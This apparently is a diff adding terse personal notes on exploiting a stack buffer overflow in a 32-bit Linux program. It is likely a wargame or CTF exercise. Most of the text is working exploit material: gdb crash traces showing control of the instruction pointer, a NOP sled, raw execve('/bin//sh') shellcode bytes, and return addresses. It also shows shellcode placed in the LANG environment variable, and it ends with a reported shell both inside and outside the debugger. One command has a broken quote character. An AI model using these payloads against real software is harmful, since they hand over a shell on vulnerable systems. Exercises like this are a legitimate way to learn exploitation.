@@ -1,0 +1,22 @@
+Gdb run $(python -c 'print "\x41 » * 32 + "C" * 8') $(python -c 'print "B" * 26')
+Program received signal SIGSEGV, Segmentation fault.
+0x43434141 in ?? ()
+Shell code ?
+0xbffff660 => address with starting \x90
+Working in gdb but not outside need to find why ?
+Because the address is not the same in gdb and outside (because of the env ?)
+How to guess the right address ?
+unset env LINES
+unset env COLUMNS when running gdb
+0xbffff5e0 => new address 
+0xbffff5de try this one
+$(python -c 'print "\x90" * 5 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "D" * 40') $(python -c 'print "\x42\x42\x42\x42\x42\x42\x42\x43\x42\x43\x42\x41\x42\x41\x42\x41\x42\x41\x42\x42\x42\x42\x62\xf6\xff\xbf"')
+Segfault 0x44444444
+$(python -c 'print "\x90" * 30 + "\x52\xf6\xff\xbf" + "\x90" * 5 + "\x31"') $(python -c 'print "\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 2')
+That’s work but not outside gdb
+We will try with putting the shell code in env variable!
+0xbffffec0 => address of LANG (env variable)
+export LANG=$(python -c 'print "\x90" * 10003 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
+After a few tries I have a shell open in bffff652
+$(python -c 'print "\x90" * 30 + "\x52\xf6\xff\xbf" + "\x90" * 5 + "\x31"') $(python -c 'print "\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 2')
+Now working in gdb and outside! Don’t forget to unset env LINES and unset env COLUMNS
